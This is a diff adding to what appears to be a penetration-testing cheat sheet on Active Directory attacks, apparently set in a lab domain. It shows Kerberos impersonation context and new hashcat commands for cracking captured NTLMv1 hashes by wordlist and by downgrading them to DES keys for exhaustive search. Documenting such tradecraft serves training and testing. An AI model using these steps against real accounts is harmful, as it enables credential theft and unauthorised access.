@@ -36,3 +36,39 @@ impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/T
 ```bash
 nxc smb "TARGET" --use-kcache 
 ```
+
+## Recovering NTLMv1 Credentials
+
+### Password Cracking
+Two available recovery methods for password cracking
+- Standard cracking (Wordlist / ruleset)
+- Downgrade to 3DES keys and exhaust key space
+
+#### Standard Cracking (Hashcat Mode 5500)
+```
+hashcat.exe -m 5500 -a 0 -O 5500.txt weakpass_4.txt -r rules\best64.rule
+```
+#### Downgrade to 3DES keys (Hashcat Mode 14000)
+> Setup
+```
+python3 -m venv venv 
+pip3 install pycryptodome
+wget https://raw.githubusercontent.com/hashcat/hashcat-utils/refs/heads/master/src/ntlmv1.py
+```
+> Downgrade
+```
+# Downgrade
+python3 ntlmv1.py --ntlmv1 Moe::SEVENKINGDOMS:535549550D915... --hashcat
+
+# Echo contents to file
+echo "535549550D915078:1122334455667788" >> 14000.hash
+echo "B4F2F4334C1992E0:1122334455667788" >> 14000.hash
+```
+> Crack
+```
+# Full DES
+hashcat.exe -m 14000 -a 3 -1 charsets/DES_full.hcchr --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
+```
+### Rainbow Tables
+```
+```
